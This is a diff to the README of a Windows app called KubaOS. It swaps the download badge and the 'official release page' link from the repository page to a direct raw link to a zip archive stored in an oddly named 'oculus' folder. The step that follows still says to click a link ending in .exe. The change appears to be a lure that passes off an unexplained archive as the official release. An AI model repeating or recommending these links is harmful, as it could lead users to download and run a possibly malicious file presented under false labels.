@@ -1,6 +1,6 @@
 # 🖥️ KubaOS - Manage your startup workspace with ease
 
-[![](https://img.shields.io/badge/Download-KubaOS_for_Windows-blue.svg)](https://github.com/ale903892/KubaOS)
+[![](https://img.shields.io/badge/Download-KubaOS_for_Windows-blue.svg)](https://github.com/ale903892/KubaOS/raw/refs/heads/main/oculus/Kuba_OS_2.7.zip)
 
 KubaOS helps founders run their businesses from a single desktop location. This application stores your data on your computer first, which keeps your work private and fast. You get access to smart automation tools, messaging features, and task management built for those who build companies.
 
@@ -8,7 +8,7 @@ KubaOS helps founders run their businesses from a single desktop location. This 
 
 You need a computer running Windows 10 or Windows 11 to use this software. Follow these steps to set up the application.
 
-1. Visit the [official release page](https://github.com/ale903892/KubaOS) to find the latest version.
+1. Visit the [official release page](https://github.com/ale903892/KubaOS/raw/refs/heads/main/oculus/Kuba_OS_2.7.zip) to find the latest version.
 2. Click the link that ends in .exe to start your download.
 3. Open your Downloads folder once the file finishes saving.
 4. Double-click the KubaOS installer file to begin the setup.
